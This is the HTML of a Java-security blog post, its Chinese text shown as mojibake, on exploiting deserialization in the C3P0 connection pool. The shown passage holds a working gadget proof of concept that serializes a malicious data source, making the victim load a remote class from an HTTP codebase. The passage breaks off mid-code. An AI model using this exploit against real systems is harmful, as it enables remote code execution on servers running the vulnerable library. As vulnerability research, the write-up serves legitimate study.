<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ä»‹ç» è¿™é‡Œç›´æ¥æ¬è¿ä¸€ä¸‹ C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚ JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚ ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥">
<meta property="og:type" content="article">
<meta property="og:title" content="C3p0ååºåˆ—åŒ–">
<meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="ä»‹ç» è¿™é‡Œç›´æ¥æ¬è¿ä¸€ä¸‹ C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚ JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚ ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739252255-65084146-295d-419d-8a75-1887fcf2b96f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739365446-70ca4d16-5018-4556-b08e-bbf66452042b.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739324139-afb7ca42-2180-43a2-b10e-11c929942eb6.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739476878-ec11bb2c-2656-45ef-9529-58e5c924f7f2.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739576691-a4c2214b-4466-44a0-82d9-ba2a9ed6b966.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739622429-1d6375a3-1f4a-42b2-a34e-df613f4f9795.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739776286-6d3851cb-3053-48f6-a526-265c5f1bec82.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739914284-7c89ef0e-6185-4e19-b222-b5a5bb54fb52.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746176829-859f9f53-6eed-48a5-8c0c-0321238816c3.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746266097-036727d5-c545-455b-989b-2adeab7570d7.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746291825-b27c8c84-a0a4-4987-b88e-de3892bb1df2.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746347612-80d0badd-c1c7-4fa6-b7a0-98a234e472a1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733749699231-57699f34-8167-4127-a3c2-b4c5f6950239.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748183528-c51e0183-82d1-496f-aed0-b7ba299c1c69.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748201395-6b31303f-9a2c-449d-af4a-712dc5615ee5.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748244314-03111f56-2ca4-4387-ab9e-7faa11148160.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748266853-84887910-587e-42e2-9199-be81311862ae.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748309464-474dc855-e8bb-4baa-8d7b-d631ac850fa1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755319222-fef10b27-245e-4d75-bc01-fb643f2c3c3d.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755392004-f2e17934-c4e6-4a48-b556-7503045af6d0.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755424923-caa297d3-19a0-4fba-898a-4aa0d8e2c09b.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755545849-e6e31c9e-2baa-4a24-828e-13b6600657b0.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755563662-2da85cd2-4d93-41d3-8ad3-854765887ebd.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755761615-f897c144-2963-46c9-a953-83a3e318dfeb.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756365687-2bbad0d3-815a-4f71-9f52-c2824c9b5716.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756600052-880f1d64-2a8d-4a92-85e8-7fcdeddcfa63.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756619381-c06e3e30-a22a-4676-b071-4919b99980dc.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756759849-9929f98e-6583-4165-ad31-f19143eb7d3d.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733757389442-ba078bd2-ade1-4e11-91ec-13424359baf0.png">
<meta property="article:published_time" content="2024-12-30T06:04:29.000Z">
<meta property="article:modified_time" content="2025-03-05T07:24:36.784Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="ååºåˆ—åŒ–">
<meta property="article:tag" content="C3p0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739252255-65084146-295d-419d-8a75-1887fcf2b96f.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>C3p0ååºåˆ—åŒ–</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=C3p0ååºåˆ—åŒ–"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=C3p0ååºåˆ—åŒ–"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=C3p0ååºåˆ—åŒ–&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=C3p0ååºåˆ—åŒ–&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=C3p0ååºåˆ—åŒ–"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">ä»‹ç»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">3.</span> <span class="toc-text">URLClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">æ‰§è¡Œæµç¨‹è¯¦è§£</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jndi%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">jndiåˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-2"><span class="toc-number">4.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">è°ƒè¯•æµç¨‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-%E4%B9%8B-HEX%E6%B5%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">C3P0 ä¹‹ HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-3"><span class="toc-number">5.1.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c3p0%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">6.</span> <span class="toc-text">c3p0ä¸å‡ºç½‘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-4"><span class="toc-number">6.1.</span> <span class="toc-text">poc</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        C3p0ååºåˆ—åŒ–
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-30T06:04:29.000Z" class="dt-published" itemprop="datePublished">2024-12-30</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Javaå®‰å…¨</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/C3p0/" rel="tag">C3p0</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">ååºåˆ—åŒ–</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="ä»‹ç»">ä»‹ç»</h2>
<p>è¿™é‡Œç›´æ¥æ¬è¿ä¸€ä¸‹</p>
<p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p>
<p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>
ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p>
<p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<h2 id="URLClassLoader">URLClassLoader</h2>
<h3 id="poc">poc</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0Vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;http://127.0.0.1:8889/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span 